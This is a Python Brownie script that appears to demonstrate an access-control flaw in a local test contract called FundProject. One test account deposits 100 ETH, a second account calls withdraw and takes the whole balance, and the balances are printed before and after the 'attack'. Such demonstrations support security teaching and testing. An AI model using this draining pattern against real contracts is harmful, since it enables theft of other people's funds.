from brownie import accounts, FundProject

ETH = 10**18


def main():
    # Deploy Contract
    _contract_ = accounts[0].deploy(FundProject)

    # Fund certain amount from accounts[0]
    _contract_.fund({"from": accounts[0], "value": f"{100*ETH}"})
    print("Before Attacking----------")
    print(f"Account A Balance: {accounts[0].balance()/ETH}")
    print(f"Account B Balance: {accounts[1].balance()/ETH}")
    print("--------------------------")

    # Another account invoke contract's withdraw
    # and get all balance from the contract
    _contract_.withdraw({"from": accounts[1]})

    # 3). Show accounts balance
    print("After Attacking----------")
    print(f"Account A Balance: {accounts[0].balance()/ETH}")
    print(f"Account B Balance: {accounts[1].balance()/ETH}")
    print("--------------------------")
